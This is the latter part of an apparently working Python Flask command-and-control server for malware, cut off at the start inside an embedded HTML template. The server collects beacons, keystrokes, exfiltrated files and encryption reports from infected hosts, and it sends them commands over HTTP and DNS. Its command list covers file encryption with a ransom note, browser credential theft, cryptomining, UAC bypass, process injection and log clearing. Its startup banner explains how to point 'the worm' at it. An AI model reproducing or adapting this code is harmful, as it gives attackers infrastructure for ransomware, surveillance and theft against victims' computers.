            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0a0a1a;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 24px 30px;
            border-radius: 16px;
            margin-bottom: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .header h1 {
            font-size: 24px;
            font-weight: 600;
        }
        .header h1 span { color: #ff6b35; }
        .header .sub {
            color: #888;
            font-size: 13px;
            margin-top: 4px;
        }
        .back-btn {
            padding: 10px 24px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 10px;
            color: white;
            cursor: pointer;
            text-decoration: none;
            transition: 0.3s;
        }
        .back-btn:hover {
            background: rgba(255,255,255,0.1);
        }
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }
        .info-card {
            background: rgba(255,255,255,0.03);
            border-radius: 12px;
            padding: 16px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .info-card .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; }
        .info-card .value { font-size: 18px; font-weight: 600; margin-top: 4px; }
        .info-card .value .badge {
            font-size: 12px;
            padding: 2px 10px;
            border-radius: 20px;
            font-weight: 600;
        }
        .section {
            background: rgba(255,255,255,0.03);
            border-radius: 16px;
            padding: 24px;
            margin-bottom: 24px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .section h2 {
            color: #ff6b35;
            margin-bottom: 16px;
            font-size: 18px;
            font-weight: 600;
        }
        .log-entry {
            padding: 10px 12px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            font-size: 14px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .log-entry .timestamp { color: #555; font-size: 12px; }
        .log-entry .command { font-family: 'Courier New', monospace; font-size: 13px; }
        .status-online { color: #00ff88; }
        .status-offline { color: #ff4444; }
        .badge {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 600;
        }
        .badge-success { background: rgba(0,255,136,0.15); color: #00ff88; }
        .badge-warning { background: rgba(255,170,0,0.15); color: #ffaa00; }
        .badge-danger { background: rgba(255,68,68,0.15); color: #ff4444; }
        .badge-info { background: rgba(100,149,237,0.15); color: #6495ed; }
        .keylog-container {
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
        }
        .keylog-container .entry {
            padding: 4px 8px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            display: flex;
            justify-content: space-between;
        }
        .keylog-container .entry .time { color: #555; font-size: 11px; }
        .empty {
            color: #555;
            text-align: center;
            padding: 30px;
            font-style: italic;
        }
        @media (max-width: 768px) {
            .header { flex-direction: column; gap: 16px; text-align: center; }
            .info-grid { grid-template-columns: 1fr 1fr; }
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🖥️ <span>{{ host.hostname }}</span></h1>
            <div class="sub">
                ID: {{ host.id[:8] }}... • 
                <span class="status-{{ host.status }}">
                    ● {{ host.status }}
                </span>
                • {{ host.os }}
            </div>
        </div>
        <a href="/" class="back-btn">← Back to Dashboard</a>
    </div>

    <div class="info-grid">
        <div class="info-card">
            <div class="label">OS</div>
            <div class="value">{{ host.os or 'Unknown' }}</div>
        </div>
        <div class="info-card">
            <div class="label">Version</div>
            <div class="value" style="font-size:14px;">{{ host.os_version or 'Unknown' }}</div>
        </div>
        <div class="info-card">
            <div class="label">Architecture</div>
            <div class="value">{{ host.architecture or 'Unknown' }}</div>
        </div>
        <div class="info-card">
            <div class="label">IP Address</div>
            <div class="value">{{ host.ip or 'Unknown' }}</div>
        </div>
        <div class="info-card">
            <div class="label">Encrypted Extension</div>
            <div class="value">{{ host.encrypted_ext or 'None' }}</div>
        </div>
        <div class="info-card">
            <div class="label">First Seen</div>
            <div class="value" style="font-size:14px;">{{ host.first_seen[:19] if host.first_seen else '-' }}</div>
        </div>
        <div class="info-card">
            <div class="label">Last Seen</div>
            <div class="value" style="font-size:14px;">{{ host.last_seen[:19] if host.last_seen else '-' }}</div>
        </div>
        <div class="info-card">
            <div class="label">Features</div>
            <div class="value">
                {% if host.keylogger_active %}<span class="badge badge-success">⌨️</span>{% endif %}
                {% if host.webcam_available %}<span class="badge badge-info">📷</span>{% endif %}
                {% if host.mining_active %}<span class="badge badge-warning">⛏️</span>{% endif %}
                {% if host.files_encrypted %}<span class="badge badge-danger">🔒</span>{% endif %}
            </div>
        </div>
        <div class="info-card">
            <div class="label">Keylog Count</div>
            <div class="value">{{ host.keylog_count|default(0) }}</div>
        </div>
        <div class="info-card">
            <div class="label">Encrypted Files</div>
            <div class="value">{{ host.encrypted_count|default(0) }}</div>
        </div>
        <div class="info-card">
            <div class="label">Exfiltrated Files</div>
            <div class="value">{{ host.exfiltrated_count|default(0) }}</div>
        </div>
    </div>

    <div class="section">
        <h2>📜 Command History</h2>
        {% if host.commands %}
            {% for cmd in host.commands %}
            <div class="log-entry">
                <span class="command">{{ cmd.command }}</span>
                <span>
                    <span class="badge badge-{% if cmd.status == 'completed' %}success{% elif cmd.status == 'pending' %}warning{% else %}danger{% endif %}">
                        {{ cmd.status }}
                    </span>
                    <span class="timestamp">{{ cmd.issued[:19] if cmd.issued else '-' }}</span>
                </span>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No commands issued yet</div>
        {% endif %}
    </div>

    <div class="section">
        <h2>📡 Recent Beacons</h2>
        {% if beacons %}
            {% for beacon in beacons[:20] %}
            <div class="log-entry">
                <span>{{ beacon.data.type|default('unknown') }}</span>
                <span class="timestamp">{{ beacon.timestamp[:19] if beacon.timestamp else '-' }}</span>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No beacons received yet</div>
        {% endif %}
    </div>

    <div class="section">
        <h2>⌨️ Keylogs</h2>
        <div class="keylog-container" id="keylogs">
            <div class="empty">Loading...</div>
        </div>
    </div>

    <script>
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function loadKeylogs() {
            fetch('/api/keylogs/{{ host.id }}')
                .then(r => r.json())
                .then(logs => {
                    const container = document.getElementById('keylogs');
                    if (logs.length === 0) {
                        container.innerHTML = '<div class="empty">No keylogs available</div>';
                        return;
                    }
                    container.innerHTML = logs.slice(0, 100).map(log => `
                        <div class="entry">
                            <span>${escapeHtml(log.key)}</span>
                            <span class="time">${log.timestamp.slice(0,19)}</span>
                        </div>
                    `).join('');
                })
                .catch(() => {
                    document.getElementById('keylogs').innerHTML = '<div class="empty">Error loading keylogs</div>';
                });
        }

        loadKeylogs();
        setInterval(loadKeylogs, 30000);
    </script>
</body>
</html>
'''

# ============================================================
# FLASK APP
# ============================================================

app = Flask(__name__)
app.secret_key = SECRET_KEY
socketio = SocketIO(app, cors_allowed_origins="*")

db = C2Database()
dns_c2 = DNSC2Server(db)
dns_c2.start()

# ============================================================
# ROUTES
# ============================================================

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    hosts = db.get_hosts()
    stats = {
        'total_hosts': len(hosts),
        'online_hosts': len([h for h in hosts if h['status'] == 'online']),
        'keylogger_active': len([h for h in hosts if h['keylogger_active']]),
        'mining_active': len([h for h in hosts if h['mining_active']])
    }
    return render_template_string(DASHBOARD_TEMPLATE, hosts=hosts, stats=stats)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username == ADMIN_USERNAME and password == ADMIN_PASSWORD:
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error='Invalid credentials')
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/host/<host_id>')
def host_detail(host_id):
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    host = db.get_host(host_id)
    if not host:
        return 'Host not found', 404
    
    beacons = db.get_beacons(host_id, limit=20)
    return render_template_string(HOST_DETAIL_TEMPLATE, host=host, beacons=beacons)

# ============================================================
# API ROUTES
# ============================================================

@app.route('/api/hosts')
def api_hosts():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    hosts = db.get_hosts()
    return jsonify(hosts)

@app.route('/api/host/<host_id>')
def api_host(host_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    host = db.get_host(host_id)
    return jsonify(host)

@app.route('/api/command', methods=['POST'])
def api_command():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    data = request.json
    host_id = data.get('host_id')
    command = data.get('command')
    params = data.get('params', {})
    
    if not host_id or not command:
        return jsonify({'error': 'Missing host_id or command'}), 400
    
    command_id = db.add_command(host_id, command, params)
    
    dns_c2.add_command_for_host(host_id, {
        'id': command_id,
        'cmd': command,
        'params': params
    })
    
    return jsonify({
        'success': True,
        'command_id': command_id,
        'message': f'Command {command} sent to {host_id}'
    })

@app.route('/api/beacon', methods=['POST'])
def api_beacon():
    data = request.json
    
    if not data:
        return jsonify({'error': 'No data'}), 400
    
    host_id = data.get('host_id')
    hostname = data.get('hostname')
    os_type = data.get('os')
    os_version = data.get('os_version')
    architecture = data.get('architecture')
    ip = request.remote_addr
    
    db.add_host({
        'host_id': host_id,
        'hostname': hostname or 'unknown',
        'os': os_type or 'unknown',
        'os_version': os_version or 'unknown',
        'architecture': architecture or 'unknown',
        'ip': ip,
        'encrypted_ext': data.get('encrypted_ext', '')
    })
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO beacons (host_id, data, timestamp)
                 VALUES (?, ?, ?)''',
              (host_id, json.dumps(data), datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    db.update_host_status(host_id, 'online')
    
    if data.get('type') == 'keylog':
        for entry in data.get('entries', []):
            db.add_keylog(host_id, entry.get('key'))
    
    if data.get('type') == 'encryption':
        db.add_encrypted_file(
            host_id,
            data.get('file_path'),
            data.get('size', 0)
        )
    
    if data.get('type') == 'exfiltrated_file':
        db.add_exfiltrated_file(
            host_id,
            data.get('path'),
            data.get('data', '')
        )
    
    pending = db.get_pending_commands(host_id)
    
    socketio.emit('beacon', {
        'host_id': host_id,
        'data': data,
        'timestamp': datetime.datetime.now().isoformat()
    })
    
    return jsonify({
        'status': 'success',
        'commands': pending
    })

@app.route('/api/command_result', methods=['POST'])
def api_command_result():
    data = request.json
    
    command_id = data.get('command_id')
    result = data.get('result')
    status = data.get('status', 'completed')
    
    if command_id:
        db.update_command_result(command_id, result, status)
        socketio.emit('command_result', {
            'command_id': command_id,
            'result': result,
            'status': status
        })
        return jsonify({'success': True})
    
    return jsonify({'error': 'No command_id'}), 400

@app.route('/api/keylogs/<host_id>')
def api_keylogs(host_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT key, timestamp FROM keylogs WHERE host_id = ? ORDER BY timestamp DESC LIMIT 100', 
              (host_id,))
    logs = []
    for row in c.fetchall():
        logs.append({
            'key': row[0],
            'timestamp': row[1]
        })
    conn.close()
    
    return jsonify(logs)

@app.route('/api/encrypted_files/<host_id>')
def api_encrypted_files(host_id):
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT file_path, size, timestamp FROM encrypted_files WHERE host_id = ? ORDER BY timestamp DESC LIMIT 50', 
              (host_id,))
    files = []
    for row in c.fetchall():
        files.append({
            'file_path': row[0],
            'size': row[1],
            'timestamp': row[2]
        })
    conn.close()
    
    return jsonify(files)

@app.route('/api/stats')
def api_stats():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    hosts = db.get_hosts()
    
    stats = {
        'total_hosts': len(hosts),
        'online_hosts': len([h for h in hosts if h['status'] == 'online']),
        'offline_hosts': len([h for h in hosts if h['status'] != 'online']),
        'keylogger_active': len([h for h in hosts if h['keylogger_active']]),
        'mining_active': len([h for h in hosts if h['mining_active']]),
        'os_breakdown': {}
    }
    
    for host in hosts:
        os_type = host['os'] or 'unknown'
        stats['os_breakdown'][os_type] = stats['os_breakdown'].get(os_type, 0) + 1
    
    return jsonify(stats)

@app.route('/api/command_templates')
def api_command_templates():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    templates = {
        'status': {'params': {}},
        'encrypt': {'params': {'password': ''}},
        'encrypt_files': {'params': {'file_paths': ['/path/to/file.txt'], 'password': ''}},
        'encrypt_directory': {'params': {'directory': '/path/to/dir', 'password': '', 'recursive': True}},
        'decrypt': {'params': {'password': ''}},
        'decrypt_files': {'params': {'file_paths': ['/path/to/file.txt.encrypted'], 'password': ''}},
        'decrypt_directory': {'params': {'directory': '/path/to/dir', 'password': '', 'recursive': True}},
        'keylog_start': {'params': {'duration': 60}},
        'keylog_stop': {'params': {}},
        'webcam_capture': {'params': {}},
        'webcam_stream': {'params': {'duration': 10, 'frame_rate': 5}},
        'screenshot': {'params': {}},
        'execute': {'params': {'command': 'whoami'}},
        'exfiltrate': {'params': {'max_files': 50}},
        'steal_browser': {'params': {}},
        'start_mining': {'params': {'wallet_address': ''}},
        'stop_mining': {'params': {}},
        'display_ransom_note': {'params': {}},
        'block_computer': {'params': {'action': 'lock'}},
        'clear_logs': {'params': {}},
        'bypass_uac': {'params': {}},
        'self_destruct': {'params': {'confirm': True}},
        'encryption_status': {'params': {}},
        'encryption_stats': {'params': {}},
        'inject_process': {'params': {'pid': 1234}},
        'check_environment': {'params': {}}
    }
    
    return jsonify(templates)

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM keylogs')
    c.execute('DELETE FROM beacons')
    conn.commit()
    conn.close()
    
    return jsonify({'success': True, 'message': 'Logs cleared'})

# ============================================================
# WEBSOCKET EVENTS
# ============================================================

@socketio.on('connect')
def handle_connect():
    logger.info('Client connected to WebSocket')
    emit('connected', {'status': 'Connected to C2 server'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info('Client disconnected from WebSocket')

@socketio.on('get_hosts')
def handle_get_hosts():
    hosts = db.get_hosts()
    emit('hosts', hosts)

@socketio.on('send_command')
def handle_send_command(data):
    host_id = data.get('host_id')
    command = data.get('command')
    params = data.get('params', {})
    
    if host_id and command:
        command_id = db.add_command(host_id, command, params)
        dns_c2.add_command_for_host(host_id, {
            'id': command_id,
            'cmd': command,
            'params': params
        })
        emit('command_sent', {
            'host_id': host_id,
            'command': command,
            'command_id': command_id
        })

# ============================================================
# MAIN
# ============================================================

def main():
    """Start the C2 server"""
    print("="*60)
    print("🕵️ C2 SERVER v2.0")
    print("="*60)
    print(f"🌐 Server URL: http://{C2_HOST}:{C2_PORT}")
    print(f"🔑 Username: {ADMIN_USERNAME}")
    print(f"🔑 Password: {ADMIN_PASSWORD}")
    print("="*60)
    print("📡 Waiting for connections...")
    print("="*60)
    print()
    print("💡 To connect the worm, set C2_SERVER to:")
    print(f"   C2_SERVER = '{socket.gethostbyname(socket.gethostname())}'")
    print()
    print("⚠️  IMPORTANT: Change the admin password in the code!")
    print("="*60)
    
    socketio.run(app, host=C2_HOST, port=C2_PORT, debug=False, allow_unsafe_werkzeug=True)

if __name__ == "__main__":
    main()
